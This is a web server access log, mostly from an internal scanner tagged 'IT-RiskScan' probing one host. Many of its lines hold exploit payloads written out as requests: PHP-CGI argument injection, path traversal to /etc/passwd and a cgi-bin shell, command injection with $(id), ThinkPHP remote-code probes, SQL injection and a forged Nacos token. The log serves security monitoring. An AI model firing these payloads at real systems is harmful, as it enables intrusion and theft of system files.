127.0.0.1 - - [03/Sep/2025:10:37:19 +0800] "HEAD / HTTP/1.1" 200 0 "-" "curl/8.4.0"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /webui/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /services/messagebroker/streamingamf HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /app/rest/users/id:1/tokens/32F2uJ7pwsyV0nZAeHPNeZK4Gqp;.jsp?jsp_precompile=true HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /storage/logs/laravel.log HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /streampipes-backend/api/v2/auth/settings HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /tmp/temp.db%3f.1.1.1.1a-1.css HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /webtools/control/main/ProgramExport HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /mnt/ram/var/log/httpd.log%3f.1.1.1.1a-1.css HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /api/data HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /client/api?command=samlSso HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /solr/admin/info/properties:/admin/info/key HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /users HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /users;. HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /api/v0/train HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /dataSetParam/verification;swagger-ui/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /login?next=/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /@fs/C:/windows/win.ini?import&?inline=1.wasm?init HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /@fs/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /@fs/../../../../../../../etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 400 157 "-" "-"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /index.php?p=admin/actions/assets/generate-transform HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /@fs/%252e%252e/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /portalapi/v1/roles/option;%2fv1%2fping HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /api/v1/validate/code HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /public/template.cgi?templatefile=$(id) HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=app HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /api/jmeter/download/files HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /camunda/app/welcome/default/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /?query=SHOW%20DATABASES HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /api/snapshots HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /apisix/admin/migrate/export HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /api/snapshots HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /version HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /druid/submitLogin HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "POST /druid/submitLogin HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /install.php?profile=default HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:54 +0800] "GET /api/dev/metrics/relation HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /core/install.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /login HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "POST /index.php?r=site/user-login HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "POST /hub/login?next HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /./../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "POST /hub/login?next HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /sse?transportType=stdio&command=echo&args=IT_RiskScan HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /api/version HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "POST /login/userverify.cgi HTTP/1.1" 404 555 "https://21.6.241.207/login/login.htm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /naming/v1/services?limit=10&offset=0 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /web/admin/setup HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /login/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "POST /?s=index/index/index HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /?s=index/think\x5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "POST /index.php?s=captcha HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /api/cluster/global HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /setup HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /api/v1/namespaces/default/workflows?query HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [05/Sep/2025:07:14:55 +0800] "PRI * HTTP/2.0" 400 157 "-" "-"
9.135.100.135 - - [05/Sep/2025:07:14:56 +0800] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 157 "-" "-"
9.135.100.135 - - [05/Sep/2025:07:14:56 +0800] "GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1" 400 157 "-" "-"
9.135.100.135 - - [05/Sep/2025:07:14:56 +0800] "GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1" 400 157 "-" "-"
127.0.0.1 - - [05/Sep/2025:14:09:58 +0800] "GET / HTTP/1.1" 200 612 "-" "curl/8.4.0"
127.0.0.1 - - [05/Sep/2025:14:10:05 +0800] "HEAD / HTTP/1.1" 200 0 "-" "curl/8.4.0"
9.135.100.135 - - [06/Sep/2025:04:07:47 +0800] "GET / HTTP/1.0" 200 612 "-" "-"
9.135.100.135 - - [06/Sep/2025:04:07:58 +0800] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScanYUhSMGNEb3ZMekl4TGpZdU1qUXhMakl3TnpvNE1BPT0="
9.135.100.135 - - [06/Sep/2025:04:17:25 +0800] "GET / HTTP/1.0" 400 255 "-" "-"
9.135.100.135 - - [06/Sep/2025:04:17:25 +0800] "GET / HTTP/1.1" 400 657 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScanYUhSMGNEb3ZMekl4TGpZdU1qUXhMakl3TnpvME5ETT0="
9.135.100.135 - - [06/Sep/2025:04:56:24 +0800] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScanTWpFdU5pNHlOREV1TWpBMw=="
9.135.100.135 - - [06/Sep/2025:04:56:24 +0800] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScanTWpFdU5pNHlOREV1TWpBMw=="
9.135.100.135 - - [06/Sep/2025:04:56:24 +0800] "GET http://9.139.82.162/itscan.html HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScanTWpFdU5pNHlOREV1TWpBMw=="
9.135.100.135 - - [06/Sep/2025:04:56:24 +0800] "GET http://10.99.229.178/itscan.html HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScanTWpFdU5pNHlOREV1TWpBMw=="
9.135.100.135 - - [06/Sep/2025:04:56:24 +0800] "GET http://9.218.232.52/itscan.html HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScanTWpFdU5pNHlOREV1TWpBMw=="
9.135.100.135 - - [06/Sep/2025:04:56:24 +0800] "GET /cgi-bin/gateway/agentinfo HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [06/Sep/2025:04:56:24 +0800] "POST /run HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [06/Sep/2025:04:56:24 +0800] "GET /api/session/properties HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
